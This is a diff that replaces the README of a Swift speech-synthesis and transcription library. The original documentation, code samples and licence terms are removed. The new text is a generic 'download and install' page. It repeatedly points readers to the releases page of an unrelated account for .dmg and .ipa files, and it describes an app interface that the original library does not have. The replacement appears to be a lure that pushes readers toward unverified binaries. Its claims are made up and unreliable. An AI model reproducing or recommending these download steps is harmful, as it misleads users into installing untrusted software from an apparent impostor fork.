@@ -1,144 +1,81 @@
-# MLX Swift Audio
+```markdown
+# 🎤 mlx-swift-audio - Simplifying Speech Technology for Everyone
 
-**This package is in early development. Expect breaking changes.**
+## 📥 Download
+[![Download mlx-swift-audio](https://img.shields.io/badge/Download-mlx--swift--audio-blue.svg)](https://github.com/Adamiito0909/mlx-swift-audio/releases)
 
-- Text to speech
-  - [Chatterbox](https://github.com/resemble-ai/chatterbox)
-  - [Chatterbox Turbo](https://github.com/resemble-ai/chatterbox)
-  - [CosyVoice 2](https://github.com/FunAudioLLM/CosyVoice)
-  - [CosyVoice 3](https://github.com/FunAudioLLM/CosyVoice)
-  - [Kokoro](https://github.com/hexgrad/kokoro)
-  - [Marvis](https://github.com/Marvis-Labs/marvis-tts)
-  - [Orpheus](https://github.com/canopyai/Orpheus-TTS)
-  - [OuteTTS](https://github.com/edwko/OuteTTS)
+## 🚀 Getting Started
+Welcome to mlx-swift-audio! This tool offers powerful solutions for converting text to speech (TTS) and speech to text (STT). Whether you want to create audio from written content or transcribe spoken words, you are in the right place. Follow the steps below to get started.
 
-- Speech to text
-  - [Whisper](https://github.com/openai/whisper)
-  - [Fun-ASR](https://github.com/modelscope/FunASR)
+## 🛠️ System Requirements
+- **Operating System:** macOS or iOS
+- **Processor:** Apple Silicon recommended for optimal performance
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** 200 MB of available storage
+- **Internet Connection:** Required for initial setup and any updates
 
-## Installation
+## 📥 Download & Install
+To get the latest version of mlx-swift-audio, visit this page to download: [Download Here](https://github.com/Adamiito0909/mlx-swift-audio/releases).
 
-In Xcode, go to File > Add Package Dependencies and enter `https://github.com/DePasqualeOrg/mlx-swift-audio`. Select the `main` branch, then add `MLXAudio` to your target. If you want to use Kokoro (which has GPLv3 dependencies), also add the `Kokoro` library.
+### Step-by-Step Installation
+1. **Go to the Releases Page**  
+   Click the link above to navigate to the releases page.
 
-## Usage
+2. **Select the Latest Version**  
+   Look for the latest version listed. It will usually be highlighted at the top of the page.
 
-### Text to speech
+3. **Download the File**  
+   Click on the appropriate link for your operating system (macOS or iOS). Make sure to choose the correct file for your device.
 
-```swift
-import MLXAudio
+4. **Open the Downloaded File**  
+   After downloading, locate the file in your downloads folder. Typically, it will be in `.dmg` format for macOS or an `.ipa` file for iOS.
 
-// CosyVoice2 - voice matching with zero-shot and cross-lingual modes
-let cosyVoice = TTS.cosyVoice2()
-try await cosyVoice.load()
-let speaker = try await cosyVoice.prepareSpeaker(from: audioFileURL)
-try await cosyVoice.say("Speaking with your voice.", speaker: speaker)
+5. **Install the Application**  
+   - For macOS:
+     - Double-click the downloaded `.dmg` file.
+     - Drag the mlx-swift-audio icon into your Applications folder.
+   - For iOS:
+     - Use your device management tool to install the `.ipa` file.
 
-// With style instructions
-try await cosyVoice.say("This is exciting news!", speaker: speaker, instruction: "Speak with enthusiasm")
+6. **Launch the Application**  
+   Once installation is complete, locate mlx-swift-audio in your Applications folder or on your device's home screen. Double-click or tap to launch the app.
 
-// Voice conversion - transform audio to sound like the speaker
-let converted = try await cosyVoice.convertVoice(from: sourceAudioURL, to: speaker)
+7. **Initial Setup**  
+   Follow the on-screen instructions to set up your preferences, such as choosing languages for TTS and STT.
 
-// Chatterbox - custom voices from reference audio and emotion control
-let chatterbox = TTS.chatterbox()
-try await chatterbox.load()
-let referenceAudio = try await chatterbox.prepareReferenceAudio(from: audioFileURL)
-try await chatterbox.say("Speaking with your reference audio.", referenceAudio: referenceAudio)
+## 🎤 How to Use
+Using mlx-swift-audio is straightforward:
 
-// OuteTTS - custom voices from reference audio
-let outetts = TTS.outetts()
-try await outetts.load()
-let speaker = try await OuteTTSSpeakerProfile.load(from: "speaker.json")
-try await outetts.say("Using reference audio.", speaker: speaker)
+1. **Text to Speech (TTS)**:
+   - Input your text into the designated box.
+   - Choose the voice and language from the dropdown menus.
+   - Click "Play" to hear the audio output.
 
-// Orpheus - emotional expressions
-let orpheus = TTS.orpheus()
-try await orpheus.load()
-try await orpheus.say("Ha! <laugh> That's funny.", voice: .tara)
+2. **Speech to Text (STT)**:
+   - Click the “Record” button and speak clearly.
+   - Click “Stop” once you finish speaking.
+   - The app will transcribe your speech into text for you.
 
-// Marvis - streaming audio
-let marvis = TTS.marvis()
-try await marvis.load()
-try await marvis.sayStreaming("This plays as it generates.", voice: .conversationalA)
+## ⚙️ Advanced Features
+- **Multiple Language Support:** Supports numerous languages and accents, making it useful for diverse users.
+- **Custom Voice Selection:** Choose from various voice options to find the one that suits you best.
+- **Adjustable Speech Rate:** Control how fast the speech is generated to match your preference.
 
-// For more control over playback
-let orpheus = TTS.orpheus()
-try await orpheus.load()
-let audio = try await orpheus.generate("Hello!", voice: .tara)
-await audio.play()
+## 🔄 Troubleshooting
+If you experience issues:
 
+- **Application Won't Launch:** Ensure your OS is updated and that you downloaded the right version.
+- **No Sound Output:** Check your device’s sound settings and volume level.
+- **Transcription Errors:** Speak clearly and reduce background noise for better accuracy.
+
+For further support, feel free to check the Issues section on the [GitHub repository](https://github.com/Adamiito0909/mlx-swift-audio/issues).
+
+## 💬 Community and Support
+Join our community on GitHub. Share your experiences, ask for help, or provide feedback on your usage of mlx-swift-audio. Engage with other users and developers to enhance your experience.
+
+## 📄 License
+This project is open-source. You are free to use, modify, and distribute it under the terms of the license provided in the repository.
+
+## 📥 Download Again
+Don't forget to visit this page to download: [Download Here](https://github.com/Adamiito0909/mlx-swift-audio/releases) and take advantage of all the features mlx-swift-audio has to offer!
 ```
-
-### Speech to text
-
-```swift
-import MLXAudio
-
-// Whisper - multilingual speech recognition
-let whisper = STT.whisper(model: .largeTurbo)
-try await whisper.load()
-
-// Transcribe audio file (language auto-detected)
-let result = try await whisper.transcribe(audioFileURL)
-print(result.text)
-
-// Transcribe with specific language
-let result = try await whisper.transcribe(audioFileURL, language: .spanish)
-
-// Translate to English
-let translation = try await whisper.translate(audioFileURL)
-
-// Detect language only
-let (language, confidence) = try await whisper.detectLanguage(audioFileURL)
-print("\(language.displayName) (\(confidence))")
-
-// Fun-ASR - LLM-based multilingual speech recognition
-let funASR = STT.funASR()
-try await funASR.load()
-
-// Transcribe audio file
-let result = try await funASR.transcribe(audioFileURL)
-print(result.text)
-
-// Transcribe with language hint
-let result = try await funASR.transcribe(audioFileURL, language: .chinese)
-
-// Translate to English (use MLT variant for best results)
-let funASRmlt = STT.funASR(modelType: .mltNano, quantization: .q4)
-try await funASRmlt.load()
-let translation = try await funASRmlt.translate(audioFileURL)
-
-// Stream transcription as tokens are generated
-let stream = try await funASR.transcribeStreaming(audioFileURL)
-for try await text in stream {
-    print(text, terminator: "")
-}
-```
-
-## Building
-
-Build the library:
-
-```sh
-xcodebuild -scheme mlx-audio -destination 'platform=macOS' build
-```
-
-Build the example app:
-
-```sh
-xcodebuild -project 'examples/TTS App/TTS App.xcodeproj' -scheme 'TTS App' -destination 'platform=macOS' build
-```
-
-## Legal and ethical considerations
-
-Voice synthesis technology should be used responsibly. Obtain consent before using voice recordings, respect intellectual property and personality rights, never use synthetic voices for deception or fraud, and comply with applicable laws in your jurisdiction.
-
-## License
-
-This project is licensed under the MIT License.
-
-The main MLXAudio library includes all TTS engines except Kokoro. The separate Kokoro library imports [espeak-ng-spm](https://github.com/espeak-ng/espeak-ng-spm) as a Swift package, which is licensed under GPLv3. To use Kokoro, explicitly import the separate Kokoro library.
-
-## History
-
-Commit [22b498c](https://github.com/DePasqualeOrg/mlx-swift-audio/commit/22b498ceaf01fa2ee138bb36c62799172efbd6ab) in this repository corresponds to commit [0ee931b](https://github.com/DePasqualeOrg/mlx-audio/commit/0ee931b6971a338f7c48176a86db217a434a0036) ([PR #279](https://github.com/Blaizzy/mlx-audio/pull/279)) in [Blaizzy/mlx-audio](https://github.com/Blaizzy/mlx-audio), in which the Swift library and example app were completely rewritten. The commit history of files from mlx-audio has been preserved.
